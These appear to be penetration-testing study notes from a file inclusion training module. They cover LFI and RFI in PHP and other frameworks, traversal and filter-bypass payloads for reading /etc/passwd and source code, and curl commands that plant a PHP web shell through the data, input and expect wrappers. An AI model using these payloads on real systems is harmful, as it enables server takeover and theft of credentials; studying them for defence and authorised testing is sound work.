| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |



	> Many modern back-end languages, such as PHP, Javascript, or Java, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.

* Local File Inclusion (LFI)
	> The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like /index.php?page=about, where index.php sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called about.php. As we have control over the about portion of the request, it may be possible to have the web application grab other files and display them on the page.
	> LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.

* Examples of Vulnerable Code
	> Let's look at some examples of code vulnerable to File Inclusion to understand how such vulnerabilities occur. As mentioned earlier, file Inclusion vulnerabilities can occur in many of the most popular web servers and development frameworks, like PHP, NodeJS, Java, .Net, and many others. Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.
	> Such a file could be a dynamic header or different content based on the user-specified language. For example, the page may have a ?language GET parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different language parameter (e.g. ?language=es). In such cases, changing the language may change the directory the web application is loading the pages from (e.g. /en/ or /es/). If we have control over the path being loaded, then we may be able to exploit this vulnerability to read other files and potentially reach remote code execution.
	> PHP
	> In PHP, we may use the include() function to load a local or a remote file as we load a page. If the path passed to the include() is taken from a user-controlled parameter, like a GET parameter, and the code does not explicitly filter and sanitize the user input, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:
		if (isset($_GET['language'])) {
		    include($_GET['language']);
		}
	> We see that the language parameter is directly passed to the include() function. So, any path we pass in the language parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the include() function, as there are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include include_once(), require(), require_once(), file_get_contents(), and several others as well.
	> Note: In this module, we will mostly focus on PHP web applications running on a Linux back-end server. However, most techniques and attacks would work on the majority of other frameworks, so our examples would be the same with a web application written in any other language.

* NodeJS
	> Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter language is used to control what data is written to a page:
		if(req.query.language) {
		    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
		        res.write(data);
		    });
		}

	> As we can see, whatever parameter passed from the URL gets used by the readfile function, which then writes the file content in the HTTP response. Another example is the render() function in the Express.js framework. The following example shows uses the language parameter to determine which directory it should pull the about.html page from:
		app.get("/about/:language", function(req, res) {
		    res.render(`/${req.params.language}/about.html`);
		});
	> Unlike our earlier examples where GET parameters were specified after a (?) character in the URL, the above example takes the parameter from the URL path (e.g. /about/en or /about/es). As the parameter is directly used within the render() function to specify the rendered file, we can change the URL to show a different file instead.

* Java
	> The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:
		<c:if test="${not empty param.language}">
		    <jsp:include file="<%= request.getParameter('language') %>" />
		</c:if>
	> The include function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. The import function may also be used to render a local file or a URL, such as the following example:
		<c:import url= "<%= request.getParameter('language') %>"/>

* .NET
	> Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. The Response.WriteFile function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:
		@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
		    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
		}
	> Furthermore, the @Html.Partial() function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:
		@Html.Partial(HttpContext.Request.Query['language'])
	> Finally, the include function may be used to render local files or remote URLs, and may also execute the specified files as well:
		<!--#include file="<% HttpContext.Request.Query['language'] %>"-->

* Read vs Execute
	> From all of the above examples, we can see that File Inclusion vulnerabilities may occur in any web server and any development frameworks, as all of them provide functionalities for loading dynamic content and handling front-end templates.
	> The most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

	> The following table shows which functions may execute files and which only read file content:
		Function 			Read Content 	Execute 	Remote URL
		PHP 			
		include()/include_once() 	✅ 		✅ 		✅
		require()/require_once() 	✅ 		✅ 		❌
		file_get_contents() 		✅ 		❌ 		✅
		fopen()/file() 			✅ 		❌ 		❌
		NodeJS 			
		fs.readFile() 			✅ 		❌ 		❌
		fs.sendFile() 			✅ 		❌ 		❌
		res.render() 			✅ 		✅ 		❌
		Java 			
		include 			✅ 		❌ 		❌
		import 				✅ 		✅ 		✅
		.NET 			
		@Html.Partial() 		✅ 		❌ 		❌
		@Html.RemotePartial() 		✅ 		❌ 		✅
		Response.WriteFile() 		✅ 		❌ 		❌
		include 			✅ 		✅ 		✅

	> This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the source code without code execution. Furthermore, if we had access to the source code in a whitebox exercise or in a code audit, knowing these actions helps us in identifying potential File Inclusion vulnerabilities, especially if they had user-controlled input going into them.
	> In all cases, File Inclusion vulnerabilities are critical and may eventually lead to compromising the entire back-end server. Even if we were only able to read the web application source code, it may still allow us to compromise the web application, as it may reveal other vulnerabilities as mentioned earlier, and the source code may also contain database keys, admin credentials, or other sensitive information.


[+] Local File Inclusion (LFI)
	> Now that we understand what File Inclusion vulnerabilities are and how they occur, we can start learning how we can exploit these vulnerabilities in different scenarios to be able to read the content of local files on the back-end server.

* Basic LFI
	> The exercise we have at the end of this section shows us an example of a web app that allows users to set their language to either English or Spanish:
	> If we select a language by clicking on it (e.g. Spanish), we see that the content text changes to spanish:
	> We also notice that the URL includes a language parameter that is now set to the language we selected (es.php). There are several ways the content could be changed to match the language we specified. It may be pulling the content from a different database table based on the specified parameter, or it may be loading an entirely different version of the web app. However, as previously discussed, loading part of the page using template engines is the easiest and most common method utilized.
	> So, if the web application is indeed pulling a file that is now being included in the page, we may be able to change the file being pulled to read the content of a different local file. Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows. So, let's change the parameter from es to /etc/passwd:
	> As we can see, the page is indeed vulnerable, and we are able to read the content of the passwd file and identify what users exist on the back-end server.

* Path Traversal
	> In the earlier example, we read a file by specifying its absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include() function without any additions, like the following example:
		include($_GET['language']);
	> In this case, if we try to read /etc/passwd, then the include() function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the language parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:
		include("./languages/" . $_GET['language']);
	> In this case, if we attempt to read /etc/passwd, then the path passed to include() would be (./languages//etc/passwd), and as this file does not exist, we will not be able to read anything:
	> As expected, the verbose error returned shows us the string passed to the include() function, stating that there is no /etc/passwd in the languages directory.
	> Note: We are only enabling PHP errors on this web application for educational purposes, so we can properly understand how the web application is handling our input. For production web applications, such errors should never be shown. Furthermore, all of our attacks should be possible without errors, as they do not rely on them.
	> We can easily bypass this restriction by traversing directories using relative paths. To do so, we can add ../ before our file name, which refers to the parent directory. For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e. /var/www/html/index.php).
	> So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist:
	> As we can see, this time we were able to read the file regardless of the directory we were in. This trick would work even if the entire parameter was used in the include() function, so we can default to this technique, and it should work in both cases. Furthermore, if we were at the root path (/) and used ../ then we would still remain in the root path. So, if we were not sure of the directory the web application is in, we can add ../ many times, and it should not break the path (even if we do it a hundred times!).
	> Tip: It can always be useful to be efficient and not add unnecessary ../ several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of ../ that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with /var/www/html/ we are 3 directories away from the root path, so we can use ../ 3 times (i.e. ../../../).

* Filename Prefix
	> In our previous example, we used the language parameter after the directory, so we could traverse the path to read the passwd file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:
		include("lang_" . $_GET['language']);
	> In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid:
	> As expected, the error tells us that this file does not exist. so, instead of directly using path traversal, we can prefix a / before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories:
	> Note: This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct. Furthermore, any prefix appended to our input may break some file inclusion techniques we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.

* Appended Extensions
	> Another very common example is when an extension is appended to the language parameter, as follows:
		include($_GET['language'] . ".php");
	> This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist:
	> There are several techniques that we can use to bypass this, and we will discuss them in upcoming sections.
	> Exercise: Try to read any php file (e.g. index.php) through LFI, and see whether you would get its source code or if the file gets rendered as HTML instead.

* Second-Order Attacks
	> As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a Second Order Attack. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.
	> For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.
	> In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a Second-Order attack.
	> Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a ?page parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.
	> Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.
	> Note: All techniques mentioned in this section should work with any LFI vulnerability, regardless of the back-end development language or framework.


[+] Basic Bypasses
	> In the previous section, we saw several types of attacks that we can use for different types of LFI vulnerabilities. In many cases, we may be facing a web application that applies various protections against file inclusion, so our normal LFI payloads would not work. Still, unless the web application is properly secured against malicious LFI user input, we may be able to bypass the protections in place and reach file inclusion.

* Non-Recursive Path Traversal Filters
	> One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals. For example:
		$language = str_replace('../', '', $_GET['language']);
	> The above code is supposed to prevent path traversal, and hence renders LFI useless. If we try the LFI payloads we tried in the previous section, we get the following:
	> We see that all ../ substrings were removed, which resulted in a final path being ./languages/etc/passwd. However, this filter is very insecure, as it is not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. Let's try applying this logic to include /etc/passwd again:
	> As we can see, the inclusion was successful this time, and we're able to read /etc/passwd successfully. The ....// substring is not the only bypass we can use, as we may use ..././ or ....\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\/), or adding extra forward slashes (e.g. ....////)

* Encoding
	> Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.
	> If the target web application did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows: burp_url_encode
	> Note: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.
	> Let's try to use this encoded LFI payload against our earlier vulnerable web application that filters ../ strings:
	> As we can see, we were also able to successfully bypass the filter and use path traversal to read /etc/passwd. Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.


* Approved Paths

	> Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:
		if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
		    include($_GET['language']);
		} else {
		    echo 'Illegal path specified!';
		}
	> To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify, as follows:
		<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
	> Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.
	> Note: All techniques mentioned so far should work with any LFI vulnerability, regardless of the back-end development language or framework.

* Appended Extension
	> As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).
	> There are a couple of other techniques we may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

* Path Truncation
	> In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).
	> If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.
	> An example of such payload would be the following:
		?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
	> Of course, we don't have to manually type ./ 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:
		m1l0js@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
	> We may also increase the count of ../, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only .php gets truncated and not our requested file at the end of the string (/etc/passwd). This is why it would be easier to use the first method.

* Null Bytes
	> PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.
	> To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.


[+] PHP Filters
	> Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers(https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
	> PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as web penetration testers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. This is not only beneficial with LFI attacks, but also with other web attacks like XXE.
	> In this section, we will see how basic PHP filters are used to read PHP source code, and in the next section, we will see how different PHP wrappers can help us in gaining remote code execution through LFI vulnerabilities.

* Input Filters
	> PHP Filters(https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.
	> The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
	> There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.

* Fuzzing for PHP Files
	> The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster, as covered in the Attacking Web Applications with Ffuf module:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
	> Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
	> Even after reading the sources of any identified files, we can scan them for other referenced PHP files, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.

* Standard PHP Inclusion
	> In previous sections, if you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. For example, let's try to include the config.php page (.php extension appended by web application):
		http://<SERVER_IP>:<PORT>/index.php?language=config
	> As we can see, we get an empty result in place of our LFI string, since the config.php most likely only sets up the web app configuration and does not render any HTML output.
	> This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. SSRF), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.
	> Note: The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.

* Source Code Disclosure
	> Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:
		php://filter/read=convert.base64-encode/resource=config
	> Note: We intentionally left the resource file at the end of our string, as the .php extension is automatically appended to the end of our input string, which would make the resource we specified be config.php.
	> As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of config.php, as follows:
		m1l0js@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
			
			if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
			  header('HTTP/1.0 403 Forbidden', TRUE, 403);
			  die(header('location: /index.php'));
			}
			
			...SNIP...
	> Tip: When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.
	> We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.


###Remote Code Execution 
[+] PHP Wrappers
	> So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.
	> We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like config.php, which may match a user's password in case they re-use the same password. Or we can check the .ssh directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (id_rsa) and use it to SSH into the system.
	> Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different PHP Wrappers to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.

* Data
	> The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

	> Checking PHP Configurations
		- To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
			m1l0js@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
			<!DOCTYPE html>
			
			<html lang="en">
			...SNIP...
			 <h2>Containers</h2>
			    W1BIUF0KCjs7Ozs7Ozs7O
			    ...SNIP...
			    4KO2ZmaS5wcmVsb2FkPQo=
			<p class="read-more">

		- Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:
			m1l0js@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
			allow_url_include = On
		- Excellent! We see that we have this option enabled, so we can use the data wrapper. Knowing how to check for the allow_url_include option can be very important, as this option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

	> Remote Code Execution
		- With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.
		- So, our first step would be to base64 encode a basic PHP web shell, as follows:
		- Remote Code Execution
		       m1l0js@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
		       PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
		- Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>:
		       http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
		- We may also use cURL for the same attack, as follows:
		m1l0js@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            		uid=33(www-data) gid=33(www-data) groups=33(www-data)

* Input
	> Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
	> To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:
		m1l0js@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            		uid=33(www-data) gid=33(www-data) groups=33(www-data)
	> Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)

* Expect
	> Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
	> However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
		m1l0js@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
		extension=expect
	> As we can see, the extension configuration keyword is used to enable the expect module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:
		m1l0js@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
			uid=33(www-data) gid=33(www-data) groups=33(www-data)
	> As we can see, executing commands through the expect module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The Web Attacks module also covers using the expect module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.
	> These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the phar and zip wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.


[+] Remote File Inclusion (RFI)
	> So far in this module, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
    		- Enumerating local-only ports and web applications (i.e. SSRF)
    		- Gaining remote code execution by including a malicious script that we host
	> In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.

* Local vs. Remote File Inclusion
	> When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution. If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:
		Function 			Read Content 		Execute 		Remote URL
		PHP 			
		include()/include_once() 	✅ 			✅ 			✅
		file_get_contents() 		✅ 			❌ 			✅
		Java 			
		import 				✅ 			✅ 			✅
		.NET 			
		@Html.RemotePartial() 		✅ 			❌ 			✅
		include 			✅ 			✅ 			✅

	> As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
    		- The vulnerable function may not allow including remote URLs
    		- You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
    		- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
	> Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.

* Verify RFI
	> In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
		m1l0js@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
		allow_url_include = On
	> However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:
		http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
